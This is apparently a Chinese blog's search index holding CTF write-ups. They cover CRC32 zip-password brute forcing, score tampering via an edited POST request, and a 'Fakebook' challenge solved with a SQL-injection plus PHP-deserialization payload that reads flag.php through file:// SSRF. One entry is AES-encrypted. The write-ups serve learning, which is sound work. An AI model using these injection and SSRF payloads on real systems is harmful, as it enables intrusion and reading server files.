<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>元旦安恒月赛</title>
    <url>/2020/01/02/%E5%85%83%E6%97%A6%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="安恒元旦月赛"><a href="#安恒元旦月赛" class="headerlink" title="安恒元旦月赛"></a>安恒元旦月赛</h2><p>自己就看了这两个题目，其他都是队友解的。</p>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="爆破鬼才"><a href="#爆破鬼才" class="headerlink" title="爆破鬼才"></a>爆破鬼才</h4><p>首先爆破第一个密码（队友已经爆破出来了）abc123</p>
<p>解压后还是一个压缩包</p>
<p><img src="/pic/6.png" alt=""></p>
<p>发现<code>1.txt、2.txt、3.txt</code>长度不长，应该是要进行CRC32碰撞，附上渣渣脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">dic=string.printable</span><br><span class="line">crc = <span class="number">0x7d90ee19</span>   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic :</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                s=str(i)+str(j)+str(p)+str(q)</span><br><span class="line">                <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                    <span class="keyword">print</span>  s</span><br></pre></td></tr></table></figure>

<p>这个是计算1.txt的，计算另外两个只要把crc改一下，删除连个for循环就好</p>
<p>最后得到的结果是<code>Blowitup</code>，打开压缩包，hint.txt中的内容是<code>guess out my birthday!</code>，各种百度找它的生日，找到后提交发现都是错误的。最后提示是答案不是生日，队友提示可能是<a href="https://github.com/crorvick/outguess" target="_blank" rel="noopener"><code>outguess</code></a>加密。开始猜测密码，试了好几个都不是。开始写shell脚本（之前没有学），先跑了一遍2012年的没有正确的，改写脚本时，队友已经跑了出来。队友直接用<code>os.system</code>跑，从而避免重新学shell脚本。结论：队友太厉害，我太菜。</p>
<p>最后跑出来的密码是20140224。拿着key解密</p>
<p>得到<code>flag:flag{8322e7eed667c69f27ecbea5f96d86ca}</code></p>
<h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><p>是一个小游戏，话不多说开始玩一把。</p>
<p><img src="/pic/7.png" alt=""></p>
<p>玩了一把后查看源码，发现有一个js。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JS Planet defense game<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/style.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"canvas"</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/index.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>点进去拉到最后有几条提示</p>
<p><img src="/pic/8.png" alt=""></p>
<p>生成一个http请求，将分数发到服务器，将结果显示。</p>
<p>既然要生成请求，直接上<code>burp suite</code>，会发送一个record</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;f1ag.php HTTP&#x2F;1.1</span><br><span class="line">Host: 183.129.189.60:10001</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko&#x2F;20100101 Firefox&#x2F;71.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 9</span><br><span class="line">Origin: http:&#x2F;&#x2F;183.129.189.60:10001</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;183.129.189.60:10001&#x2F;</span><br><span class="line"></span><br><span class="line">record&#x3D;23</span><br></pre></td></tr></table></figure>

<p>将<code>record</code>改成<code>99999999999999999999999999999999999999999999999999</code>，即可拿到flag</p>
]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>安恒月赛2020</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>年末总结</title>
    <url>/2019/12/31/%E5%B9%B4%E6%9C%AB%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<script src=/js/crypto-js.js></script>
<script>
function doDecrypt (pwd, onError) {
	console.log('in doDecrypt');
	const txt = document.getElementById('enc_content').innerHTML;
	let plantext;
	try {
		const bytes = CryptoJS.AES.decrypt(txt, pwd);
		var plaintext = bytes.toString(CryptoJS.enc.Utf8);
	} catch(err) {
		if(onError) {
			onError(err);
		}
		return;
	}
	document.getElementById('enc_content').innerHTML = plaintext;
	document.getElementById('enc_content').style.display = 'block';
	document.getElementById('enc_passwd').style.display = 'none';
	if(typeof MathJax !== 'undefined') {
		MathJax.Hub.Queue(
			['resetEquationNumbers', MathJax.InputJax.TeX],
			['PreProcess', MathJax.Hub],
			['Reprocess', MathJax.Hub]
		);
	}
}
</script>
<div id="enc_content" style="display:none">U2FsdGVkX19aRl44ziliJBg0TTCMFdPbAwY28JvnE7/nefzWzy5UiZl8Lkrytr6tb/WNDnDBkoCKFwzAA+7VHgQn0+57PcW/ta18cqcVgY41K0n3eJEWhRQdYLJeN6Z1lJzTEBVJjq2c5PTaMI1jnfCjPSGD5GCy0/QceM9nWo+zcgeeMq9V4+Txdy1K574qVEb6ODk7gB5jRQHzulo62p9PDmcNjPObnjdTxHgbD7qUV437EKyg2vbCFpQUQHiVRH/8vLY2HCB2pjZHMBzKy8Tz0Pr2PMikiLeESEeKyouqAuiAjO+DEzXAzu7tpWlOxxjQVFgxlAgNnFNjTKOwiYgNgOh0UJAODKIRuQ9QGfecHRs2Ftds5GpMxTwniByibnwIYAsgSMflY7evOZvqZuWcVkiUslFWu0SQTw9NToqLeu1Gq2+oZpglb7z78Fm6LN9ZKs5b4EphKo/GKBjnhh263QSB9ysKIeXa8Rw6XYtt7fjZTdFsOye++rY8Rw840TxDCZ145CQ2GiWgxltwBgdsLJ8ZP9VdR3MnlqckaozFGatU3XgBhT7YhiplAmbmxCXbWb/1cfmN2WiD/mwEmWxFQy/SD4FNpAmyHdwYuYfBdJA4Hm63B+sT133zNXgbIr4JD1cDye+azYMeSLPkBg2woMFSvj2kzhjjolZVTy+OnKtxILYTK+IWUrviafcYI1Yp1Kr30LALjQqF0UD9wufvcg9oSMlTExd1Pv8eI5xnRF0SGni86XDQvv+JIEVK3sy7LzauhKtAdfUOxGRcK5s2rbvzCynPh8MBiVZ75ghUhovn/4tj25srXUMos09vXlIRIQ21bfp9nvTA16tlHsNbUeh/Lz/E9SZ8MN8K7pDY3EQzn9/BdNfYWixQ3KUWOlWfx+O2vNg0xg6Tp1a9fMNrbI3WVCr85iqfZ8+8Unl5UFzFUOF+BpdyfsVGFaXOdUuidmhTLo1Wvcdl1h6L/Y4DJDJ2p/sO7jmlZPlBdRbzwY/GtlzuGPEOpnqET+yC130WdblDv0dimdVPOdGaDD0njJUTsEF438dIupfSks96+b9vxVDQ4HB6nimXbU0AtCbldwL1FFMLqWP8LFQm/rkY6OEKondHDK2F2vcIzUT8hFkLbOR1jejAHMrEGPIR43+sEprVQJwa/DasPxcwk8MmTQlubtMXri7egl4tlBd5HfsKIFiHcMFePX3ALX3XpmFYDP4cAPSDCuGmk1zknzdQeCihvD6Cgt54u4xad4GFTEChTLVocrWAdHv0iy1OEZyvrix7C5oI4QDcfnPFSkW75kTdDD302TUEHErvxExq8zA9L0gtdMvLtcX31d2QYoF+HQ+kzqX/zEzfaiCQ3q9P3+PUH9Y4xd7WwF12zdGzI4T2m+s+DSGQaMo1MhKG9zefkGg78CzoSC7gGwf0QSbdHXM+rBDmn28qqKKESWHOA+3c+Sxlu94zRM8FoTx7PT2mIGaH2Z53tstYC9cMNlkVCjeXUz2VX8wl0Gdhz4xYwLdjkPIrHAwKZQGGUJFmIe1y3Q5JKdu9QnA/HM/VKmAWySn70fdA9p/HQgTVq7e+rFRgj4MDIV3tCF30+E9nrSGYG4xDURjG2bkk2+am8xzA8x7cwOmuspYofab3Sg3jA7slsmjLkc6Oe1NgNt5W1EFNTFvAQqRV/lN5OkN1ZEXqKUynzzlWymZAaKlLMZ3qtJV5emZGtRYdHGy+qVQlXs2fXniFPK0X4P/sajvQW1BEJu3V5unWk851DRhX2ZWzMhHiUO8qiUB72cJNVCHXTrxMs3rHVJmrNMjSnngKxe1p9hbtT/OK5/MzEerwgphvnboeaaRu/17sw/azvMR69PGLAbDrO1H+MeUR8+Zgj0+j2apUzIfk1JndssyINsJ2TEk25NLHDLhoW7FBPpAi3LoTmBd5MY5Np7G8B2xlkqpQAakTR3sGvmzITKUks184IEJxtXxTGlKPS6kfYCxTACVHBDOp+AvsUeHZwI+HNQqLJfVIpll5mhLNALAyPMUhBIXaPYwCslLFttDcfaIpJveCzNgdVu/avS3HCEdGPrHTsh1AhubcVhXnuaH5m01GnOOnaWwbEMM3fhL+nh7/+JYumW+ilR7Eff/VPCidH5kW8SRj2f7mBRlnKy+lwE46Crri4wVa3g4Qxi01ZZqvGSctVfi19Dq4edEbTDEI7JLmBuJcXopIfwpKzxjzWZeclA0I0MATub2nJcAj0Pm8rNw0AxYK9Ql5Q8mshEDQtYkaAV8RZcMEtHrfRF9UaM3OzlfeG4jDshWxvoyGq9Mii36yfCnXUcSvQQUW+oe19FHM7fdQRiCGzkqL1rspDbrd1S2+9Yt6Tfl6VtYiUpaw3xpAmK6koELnkjr7vKsyeSFX5SpMGlwEqbxsM0FaZ5lH06NyiVtM0DeH68BG7l7OZkJenxH1yhiNy0t0e++z88GzGxQyZGUCWaJEHIYYwEwuBZtJHjqS3QRL9fm0Yxs2pfl/h3QZ2R1IYfSjz2kr0VSfkN9s/mIRtHKLby7Zbr7hFkxXwgK9vzE/Vx76/G/uO16OksioE3nfJHdXzt1jZcFGnhqX8RLCt9JDAJx0nHRoZdqLweLjkdehml6dcJZSGLiVuC/ETwhk0x8samOCOHtUDA+PsRXoRrVtFl9kQNENKDp3OWAC/QbHBsnzAijHJm4dFDwYnT6su/RV7eslEx883jLiWg9eIw3utt6k33V1SAAc1QJngwlMIqJ4/i1M+MY4xzBeF3R7tcZxcM+LA4yJv+X8oVvT3KfBAwZgeLJUuNDqpbMBQEnlaSwWDZQ9PrpcB3N0Ossdqbp3Hd+b+jyWqVZCrPZ6u6DWcwz7agO5VCq6xYizNQT3II5zveH0CL126XOtHGp7d0s/LLsQIqgEc4gh2d61m4/6RQHoISpP6Rc99FRkFEoZn25zxX9OzGY0n8qlMQO3x17pRMy8P3PxvMeBt6oL7dXkT7NOeKmFA89f24+MbwPevPVDLQzQlTJVxdISmF8ChLnCYvymVPwBArJNGSDOtDkOt8B3qsPWgx+MreWmhe2aMBQPqlnm0ek6267FhzjKYDq0a1v3OrF1riEag/SFJOJSMTXuFK6wcAeGA3q/qR1bmsgXSC2da/iAWcsucb//HUp1hTm1vfCyON4lHwHVlaQ69xOf6PWc9d1gYq7+5Vj6MFBiirVQT8DzzSvm0u+n/yc6dA88EE/o+CfRbycM06PfI9E8R5hL8b04NQU7G5NrKGbhJoJJtYSvJI/8QwN1lJ7JdvXMgPxT1oTamGb1XGspKUHhIZ7ShAn2y+w/UxHQ4ApnFdiNLF5AIVSIrD5kNYdlt5w/lnUmjKZmguOotxBXty8eeu1q/euOij20yow/HvvOUfGoN6xDxDxjcL77JLwNYkllfh7d/SnhhJGzpy1p2lYuoNb4Dd9XBzOuqlbHL39+uDCVwIeSYGqYSF9W2ApH0nbEr7GdFfFr9NrxWJYFY+Q6CMurNvcPb5BudigzdCPc+VPdCDHF3QQM0Ez6lg1iikZABOiXD7rm1Lithuc4ZMt7TIQ2RUV6lOaJCAv1RV0FuRinLcx++1mCDR0kzgajv8E/m2wUIICCdZ3qjBOJ+FG6EhSDCRR/gKGVNpqPq0cWOnaDpacxA8y9skdvyb8WY7nykxL8+GsLBNPdiNpSJ7361D8CW38KECh3qW7llIoG4mYB4SfRPyebOAURRVjnnGd5gCK4yzVdA1m1MAPUZQf3wur4dtFue6N2FGoLC+K1gXOOCGdjQcXpU0aDty4Llmou2eB2aIooYETPZUcGOu9qdWjPkWyd0ItTyJHiB85Kduopcuwpx4qDqMYYqtSVumSKfYw14GAHqYcY2ocOOo1DCOyaYzoU9K/+OpXKQvmbqwtgLuKi8a6Ax9MYh0HRwohoEHuJkNhk7rXMD7X5RY3ixYnVkMpgRhyy8gVwKqzcKP42Yqm4QJA3a8YqdDV5wV6LeKCtXUoFRI5HCyYHIEvRCUJdS0KiDzZcfK6cCgjCMGyAna8RFWCUfKMq8cyUHGCx/cHxFtYX68HwXhvy+CmXhXVwLMvgGtXcjeqx7ddFrN8S1LC+Iq3mVann+piyG59+vH4gI5KcJHuQMTmPIxclV/eDNyq7IDzNlYAga/RUqJ3zVMGNPDYu1pncB7UqMgjgpWbTK9jWVQdEAkYvYwMbr70MX8RuO27PzB5KaT6D6umoorqDvQ16eQBnnvzKBjHBhJkynAsmnOGoXcYhN4t0acOnjt4lLUdDWpjwjxydGMyhqTdVLfoUSRCEMqgQ26qrh4hQiarqBob/3qu3knOVx4TgM0CLc5ajdzDugp5jc+29E5qX77hAx1iGDSqopyEWzAcF0F0l367DE9uFTkjNujS2k9Tg6bEIZilKFYyzNQEZObhTL7Z/AtM4KA2WsakKiAaFPviIGwmMJynhK4ffEBz9Wf3SaFAP3/6fwleSGhajcDpznvfFcv4IeGlWGuM7bQhZXBUL29+gKFMvj56GS32QNZMxld4pmNdHqtK36jvznII5DJL4P4CcBZoddkahyfl3GqV7eWWazYASlhWnsD8De34r66zLuynooaVbu2+dbJI21xDzRrv6nNeoUMcq8pOb57AGrJm/wkvCBdcFD7EVdMcTc+JR7qCyTlA0MOSkPN+EFloea/z9q4wcDR2pYgOzLUHaSbHFQyeYAhCyDMMcaK15jUU4hwrCYFj1dVKo5fNgRQRLCYswyNlv2x3GivWkFfSUmxE3ZouEyOaN/R00yFdV39p9a8PC0WqvOPnOb9Rpusi3TS6b9rX3VZkIddOkK1c7sz4FlQ/c2vT0TEPGNu1VeRMdNC63BK7cV+I1wmG6mFMJSmyNoezbrwEEWUv3KFSQnlP6cZvz6qXE/uMhO/pFWZAaebdTgwnHMBvs+97eakGp3ToKb0GTS4Oa0U70JM+pyJ2j1wBTjg1GJ0FupBOsoTCBb61i+zEVY/H768DSAQhVKfQqs2U6X37a6U+ddn5xKCpnRwLjj0wmc2vvJhq8CI2EOvo0ntGs4a4Pn8CoIJUGHZd7N0WUzQTKKibrj/SoR5g0jGWRNZ07JVo/YVRKs5CbA7pabsm+5f6SLkNwnIieNMOZFfUUzKwmNlMh3KvwfBM5wuSDJfWWIKO0FZhV0JrGMaoq+3Cyr22kpvwmA1Blo7EY1oEzX1fSPexB+YG8lsjDyTx3/R1tRD22dxuJ4fslMWybBTHjIOcq9dGWZ2zS2OqQPsb4qm6XdzG6G9Ls5o1AJU4hZFWocXnPMHhEFZrchkGDTp6ZlDA445hu54eXE5Afz2LOMyVUQGEvwtfRJ56Jxh5M6hVCiXGisbuzRDbJ8HteddXKgi09N+p2p1umlS14TaOA0hj2zwgAa+KS4D0K8eP2P0UuBTy0O7bGGZlcA0FQeVKCNMfnaYlEtmughc10iur+okfGz4+euFc3bxPI1rWfmA9z2C1v/0DBhr5nhVDYC+gYO7YKC6Wx+933o5jBVJiiwFWF+vFXIPVxQFpWD6mvlecA4Kl71yKi7/59emUExbPvDiP9KXK4uUhqm9kdrTMcSilL6Umd9lQorc6Pm5cxiSqBRnZWCH3gxhN0ykRIFY5A9HUZo0gAAsvsL79pjybVIm8qvBg+yJylJcXV7QCRrZbZWJ1w8N0MZjPytE0GIxnbv4eXBbrEAyPq5L/pH9Zgs4L7yJbxIVofCopgWgCQmRYMVbeu4uWMsqdyhOTcuhEdV4nKy5Pzu1lEaJBv8Bo3iZV8H+09z7ndavZYB7ZdfPaBIaF2zzwLdWBRTuzfUGHINCBgpovcJXzZwDf80xwFGLcLAc5iJZ6oVGzQKVJcauDdpZ1mncs1e1mgF0RQeOKUAAe3B6ILaCLNat+8753w61k606q9/v9NUt4cs37kaPKOKWAby/T3uT0cx/TPlwzYtKHodllMnOQK+ygrfH6uolTcmkiy6vtRPpd3j+sKXtC0jAmHSTtkS/vv8Gt0vw6h7mIsG7VEuxvieyB6bJsz7cNkzrlhlKP+OQhzTC7hscPxRpqT4burNsaIl55c/G/XwfoH3ehojh7yyh8eTGxU8mp7z3nElec73fj/RrEkJUxrloomncH/GRk1CXhqOJ1cIIvEiPlgvUrhVLa0aU00wGQi/TdgZ85ljpMST8+0aLxJkbK7VSSsbEdhoMdc9vJPegMwUmxAUG52N+3ac/PPJgJcEUIE1YLrdUd8ZQU8OjDYIgAlFBZvhytgpuSkEV+uYTnXqawztllB1O6T5NRImSB+RPJuGoDhJ928QZ+y5fu/UsqVgrlQhbFnxW2JZvhABdhjMtdpXoSH101kGAfwaUMdr0uzJasbYuMIsWRoHEbHIKexmn6FU7l7uAlFi8PpuYEGhYB6fJRnzqo3qcCBQ5AiyN6Tie6WPP43D+tRBeXYVUUyhG6CGdSb3z23J1xiCJGcceBLsxJp90THsKy/UBhDEO0n9XIwEtLbmQ9NSqLcrzW0XJXAfP5Joy6Hx4JEKusU</div>
<div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div>
<script>
var onError = function(error) {
	document.getElementById("enc_error").innerHTML = "password error!"
};
function decrypt() {
var passwd = document.getElementById("enc_pwd_input").value;
console.log(passwd);
doDecrypt(passwd, onError);
}
</script>
</div>]]></content>
  </entry>
  <entry>
    <title>buuoj刷题记录5</title>
    <url>/2019/12/30/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%955/</url>
    <content><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>一般文件的目录又xxx.php.bak/swp，或者查看元素、robots.txt里面有提示，或者<code>www.zip</code>等一系列文件中出现网站源码。也可以使用工具扫描</p>
<a id="more"></a>

<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>访问<code>robots.txt</code>，给了一个提示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;user.php.bak</span><br></pre></td></tr></table></figure>

<p>拿到<code>user.php</code>的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();   &#x2F;&#x2F;初始化链接</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);     &#x2F;&#x2F;设置CURLOPT_URL</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   &#x2F;&#x2F;将curl_exec()获取的信息以文件流的形式返回,而不是直接输出</span><br><span class="line">        $output &#x3D; curl_exec($ch);      &#x2F;执行CURL会话;此处存在ssrf</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);  &#x2F;&#x2F;获取博客地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);  &#x2F;&#x2F;博客地址有过滤</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问<code>flag.php</code>，显示返回是200。那么应该是要将<code>./flag.php</code>写入博客地址，让程序加载。</p>
<p>在加入一个用户时的<code>username</code>存在post注入，加入完成，进入到<code>view.php</code>发现也存在注入</p>
<h3 id="0x02-开始操作"><a href="#0x02-开始操作" class="headerlink" title="0x02 开始操作"></a>0x02 开始操作</h3><p>使用sqlmap跑了一遍post注入，发现数据库中存的是序列化后结果，应该存在序列化漏洞。</p>
<p><img src="/pic/4.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;view.php?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,&#39;O:8:&quot;UserInfo&quot;:3&#123;s:4:&quot;name&quot;;s:4:&quot;and&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure>

<p>执行结果</p>
<p><img src="/pic/5.png" alt=""></p>
<p>查看源码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"ko"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>User<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"css/bootstrap.min.css"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.3.1.slim.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/popper.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"js/bootstrap.min.js"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                username</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                age</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span><br><span class="line">                blog</span><br><span class="line">            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                2            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                12            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                file:///var/www/html/flag.php            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>the contents of his/her blog<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">width</span>=<span class="string">'100%'</span> <span class="attr">height</span>=<span class="string">'10em'</span> <span class="attr">src</span>=<span class="string">'data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3s4MzUwNjViNi1iNjBkLTQ5ZGEtYTkyYi1kZDgwZDM4MDMyZGN9IjsNCmV4aXQoMCk7DQo='</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span 